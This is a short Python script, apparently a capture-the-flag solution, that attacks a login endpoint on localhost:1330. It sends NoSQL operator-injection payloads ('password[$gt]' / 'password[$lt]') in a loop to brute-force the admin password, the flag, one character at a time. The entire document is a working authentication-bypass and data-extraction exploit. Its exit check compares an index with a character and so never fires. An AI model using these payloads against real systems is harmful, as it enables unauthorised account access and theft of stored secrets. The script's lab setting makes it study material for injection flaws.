import requests
import string
flag=""

u="http://localhost:1330/login"
headers={"content-type": "application/x-www-form-urlencoded"}

alphabit1 = string.ascii_letters
alphabit2 = "0123456789"
alphabit3 = "{}_"+chr(ord("_")+1)

check = True
while check:
    check = False
    for c in range(len(alphabit1)-1):
        payload=f"username=admin&password[$gt]={flag+alphabit1[c]}&password[$lt]={flag+alphabit1[c+1]}"
        print("testing ", payload)
        r = requests.post(u, data = payload, headers=headers)
        if "failed" not in r.text:
            print("FLAG = : %s" % (flag+alphabit1[c]))
            flag += alphabit1[c]
            check = True
            if c == "}":
                exit()
        
    for c in range(len(alphabit2)-1):
        payload=f"username=admin&password[$gt]={flag+alphabit2[c]}&password[$lt]={flag+alphabit2[c+1]}"
        print("testing ", payload)
        r = requests.post(u, data = payload, headers=headers)
        if "failed" not in r.text:
            print("FLAG = : %s" % (flag+alphabit2[c]))
            flag += alphabit2[c]
            check = True
            if c == "}":
                exit()
        
    for c in range(len(alphabit3)-1):
        payload=f"username=admin&password[$gt]={flag+alphabit3[c]}&password[$lt]={flag+alphabit3[c+1]}"
        print("testing ", payload)
        r = requests.post(u, data = payload, headers=headers)
        if "failed" not in r.text:
            print("FLAG = : %s" % (flag+alphabit3[c]))
            flag += alphabit3[c]
            check = True
            if c == "}":
                exit()
        